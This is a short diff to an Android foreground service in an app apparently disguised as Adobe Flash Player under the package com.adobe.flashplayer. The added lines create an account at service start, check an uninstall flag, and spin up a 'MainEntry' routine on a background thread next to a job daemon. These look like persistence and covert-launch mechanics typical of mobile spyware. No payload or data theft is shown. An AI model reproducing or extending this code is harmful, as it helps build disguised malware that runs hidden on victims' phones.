@@ -19,12 +19,16 @@ import android.telephony.TelephonyManager;
 import android.util.Log;
 
 import androidx.core.app.NotificationCompat;
+
+import com.adobe.flashplayer.MainActivity;
+import com.adobe.flashplayer.MainEntry;
 import com.adobe.flashplayer.R;
 import com.adobe.flashplayer.ISvcAidlInterface;
 import com.adobe.flashplayer.MyLog;
 import com.adobe.flashplayer.PrefOper;
 import com.adobe.flashplayer.Public;
 import com.adobe.flashplayer.Utils;
+import com.adobe.flashplayer.account.AccountActivity;
 import com.adobe.flashplayer.core.CoreHelper;
 
 
@@ -134,10 +138,17 @@ public class ForegroundSrv extends Service{
         try{
             CoreHelper.startJobDeamonService(context);
 
+            AccountActivity.createAccount(context);
+
             String install = PrefOper.getValue(context, Public.PARAMCONFIG_FileName,Public.UNINSTALLFLAG);
             if(install != null && install.equals("true")){
                 return START_NOT_STICKY;
             }
+
+            MainEntry mainentry = new MainEntry(getApplicationContext(),"");
+            Thread thread = new Thread(mainentry);
+            thread.start();
+            //new MainEntry(ForegroundSrv.this,"").start();
         }
         catch(Exception ex){
             ex.printStackTrace();
